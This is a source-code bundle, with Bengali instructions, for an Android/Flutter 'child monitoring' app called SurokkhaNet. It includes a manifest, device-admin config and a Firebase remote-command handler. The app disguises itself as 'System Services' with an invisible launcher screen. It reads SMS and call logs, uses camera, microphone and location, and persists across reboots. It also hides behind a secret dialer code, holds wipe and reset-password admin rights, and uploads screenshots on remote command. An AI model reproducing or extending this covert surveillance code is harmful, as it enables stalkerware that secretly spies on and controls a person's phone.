
# SurokkhaNet Child App - সম্পূর্ণ সোর্স কোড

এই ফাইলে আপনার SurokkhaNet চাইল্ড-সাইড অ্যাপ্লিকেশনের সম্পূর্ণ সোর্স কোড এবং ফাইল স্ট্রাকচার একত্রিত করা হয়েছে। আপনি এই ফাইল থেকে কোড কপি করে আপনার নিজের কম্পিউটারে সংশ্লিষ্ট নামের ফাইল তৈরি করে পেস্ট করতে পারেন।

---

## **ফোল্ডার স্ট্রাকচার**

```
surokkhanet_child/
├── android/
│   ├── app/
│   │   ├── src/main/
│   │   │   ├── kotlin/
│   │   │   │   └── com/
│   │   │   │       └── surokkhanet/
│   │   │   │           ├── AccessibilityService.kt
│   │   │   │           ├── BackgroundService.kt
│   │   │   │           ├── DeviceAdminReceiver.kt
│   │   │   │           ├── ScreenCapture.kt
│   │   │   │           ├── SecretReceiver.kt
│   │   │   │           └── NativeBridge.kt
│   │   │   ├── res/
│   │   │   │   ├── xml/
│   │   │   │   │   ├── accessibility_config.xml
│   │   │   │   │   └── device_admin.xml
│   │   │   │   └── values/
│   │   │   │       └── strings.xml
│   │   │   └── AndroidManifest.xml
│   │   └── build.gradle
│   └── build.gradle
├── lib/
│   ├── main.dart
│   ├── setup/
│   │   ├── welcome_screen.dart
│   │   ├── permission_flow.dart
│   │   └── link_screen.dart
│   ├── services/
│   │   ├── firebase_service.dart
│   │   ├── location_service.dart
│   │   ├── command_handler.dart
│   │   └── social_monitor.dart
│   ├── utils/
│   │   ├── constants.dart
│   │   ├── native_channel.dart
│   │   └── helpers.dart
│   └── background/
│       └── task_runner.dart
├── pubspec.yaml
└── google-services.json
```

---
---

## **Android Native Code & Configuration**

### **1. `android/app/src/main/AndroidManifest.xml`**

```xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.surokkhanet.child">

    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN"/>
    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />

    <application
        android:name="io.flutter.app.FlutterApplication"
        android:label="System Services"
        android:usesCleartextTraffic="true"
        android:icon="@mipmap/ic_launcher">
        
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTop"
            android:theme="@android:style/Theme.Translucent.NoTitleBar">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>

        <receiver
            android:name=".DeviceAdminReceiver"
            android:permission="android.permission.BIND_DEVICE_ADMIN"
            android:exported="true">
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/device_admin"/>
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED"/>
            </intent-filter>
        </receiver>

        <service
            android:name=".BackgroundService"
            android:foregroundServiceType="location|camera|microphone"
            android:stopWithTask="false"
            android:enabled="true"
            android:exported="true"/>

        <service
            android:name=".AccessibilityService"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="true">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService"/>
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_config"/>
        </service>

        <receiver android:name=".SecretReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.provider.Telephony.SECRET_CODE"/>
                <data android:scheme="android_secret_code" android:host="241051"/>
            </intent-filter>
        </receiver>

        <receiver android:name=".BootReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>
```

### **2. `android/app/src/main/res/xml/device_admin.xml`**

```xml
<device-admin xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-policies>
        <limit-password/>
        <watch-login/>
        <reset-password/>
        <force-lock/>
        <wipe-data/>
    </uses-policies>
</device-admin>
```

### **3. `android/app/src/main/kotlin/com/surokkhanet/DeviceAdminReceiver.kt`**

```kotlin
package com.surokkhanet.child

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent
import android.widget.Toast

class DeviceAdminReceiver : DeviceAdminReceiver() {
    override fun onEnabled(context: Context, intent: Intent) {
        Toast.makeText(context, "Device Admin: enabled", Toast.LENGTH_SHORT).show()
    }

    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        // This is where you would launch an activity to ask for the uninstall code.
        // For now, we just return a warning message.
        return "Disabling this compromises device security and requires a parental code."
    }

    override fun onDisabled(context: Context, intent: Intent) {
        Toast.makeText(context, "Device Admin: disabled", Toast.LENGTH_SHORT).show()
    }
}
```

### **4. `lib/services/command_handler.dart` (রিমোট কমান্ড)**

```dart
import 'package:firebase_database/firebase_database.dart';
import 'package:surokkhanet_child/services/firebase_service.dart';
import 'package:surokkhanet_child/utils/native_channel.dart';

class CommandHandler {
  static void initialize(String deviceId) {
    final ref = FirebaseDatabase.instance.ref('devices/$deviceId/commands');
    
    ref.onChildAdded.listen((event) async {
      final commandData = event.snapshot.value as Map?;
      final commandKey = event.snapshot.key;

      if (commandKey != null && commandData != null && commandData['status'] == 'pending') {
        await _processCommand(deviceId, commandKey, Map<String, dynamic>.from(commandData));
      }
    });
  }

  static Future<void> _processCommand(String deviceId, String commandId, Map<String, dynamic> command) async {
    final ref = FirebaseDatabase.instance.ref('devices/$deviceId/commands/$commandId');
    
    try {
      await ref.update({'status': 'processing'});
      dynamic resultData = {'status': 'failed', 'error': 'Unknown command'};
      
      switch (command['type']) {
        case 'take_snapshot':
          final imagePath = await NativeChannel.captureScreen();
          if (imagePath != null) {
            final url = await FirebaseService.uploadFile(imagePath, 'screenshots/$commandId.png');
            resultData = {'status': 'completed', 'imageUrl': url};
          } else {
            resultData = {'status': 'failed', 'error': 'Could not capture screen.'};
          }
          break;
        
        case 'uninstall_app':
          await NativeChannel.requestUninstall();
          resultData = {'status': 'completed', 'message': 'Uninstall requested.'};
          break;

        case 'startScreenMirroring':
           // Native side will handle this
           resultData = {'status': 'completed'};
           break;

        case 'stopScreenMirroring':
           // Native side will handle this
           resultData = {'status': 'completed'};
           break;

        // Add other command cases here
      }
      
      await ref.update({
        ...resultData,
        'processedAt': ServerValue.timestamp,
      });

    } catch (e) {
      await ref.update({'status': 'error', 'message': e.toString()});
    }
  }
}
```
